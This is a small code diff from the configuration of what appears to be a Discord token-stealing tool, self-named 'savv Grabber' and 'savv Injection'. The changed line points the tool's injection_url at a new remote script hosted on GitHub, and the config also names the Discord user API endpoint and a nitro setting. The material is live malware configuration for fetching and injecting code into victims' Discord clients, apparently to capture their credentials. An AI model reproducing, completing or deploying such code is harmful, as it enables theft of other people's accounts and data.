@@ -14,7 +14,7 @@ const config = {
   embed_name: 'savv Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1351697032091271232/1359812853401387180/savv_Grabber.png?ex=67f8d7e8&is=67f78668&hm=7a62968fc19a9922fb56853f93701046bb85f93cddb635a0fbeaf9178daa9bc7&'.replace(/ /g, '%20'),
   embed_color: 15548997, 
-  injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/539835689456/main/good.js', 
+  injection_url: 'https://raw.githubusercontent.com/savv70/injection/refs/heads/main/injection_v2', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
